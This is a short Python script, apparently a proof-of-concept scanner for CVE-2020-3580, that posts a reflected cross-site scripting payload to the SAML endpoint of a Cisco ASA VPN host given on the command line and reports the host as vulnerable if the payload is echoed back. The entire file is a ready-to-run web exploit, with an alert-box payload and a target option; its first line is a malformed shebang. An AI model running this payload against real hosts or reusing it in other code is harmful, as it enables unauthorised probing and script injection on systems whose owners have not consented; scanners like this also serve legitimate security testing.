#/usr/bin/python3 env
# encoding: utf-8

import requests
from optparse import OptionParser
import re
import warnings
warnings.filterwarnings('ignore')

def asa(domain):
    url = "https://"+domain+"/+CSCOE+/saml/sp/acs?tgname=a"
    post_data = """SAMLResponse="><svg/onload=alert('PTSwarm')>"""
    req = requests.post(url=url,data=post_data,verify=False)
    if req.status_code == 200:
        result_data = req.text
        if re.search("PTSwarm",result_data):
            print(domain+" is vulnerable.")
        else:
            print(domain,"Response code is 200.Response data is",result_data)
    else:
        print(domain,"Response code is ",req.status_code)

if __name__ == "__main__":
    usage = "python cve-2020-3580.py -t 192.168.1.1"
    parser = OptionParser(usage)
    parser.add_option("-t","--target",dest="target",default="",help="domain,ip. e.g: vpn.example.com")
    (options, args) = parser.parse_args()

    if not options.target:
        parser.print_help()
    else:
        target = options.target
        asa(target)
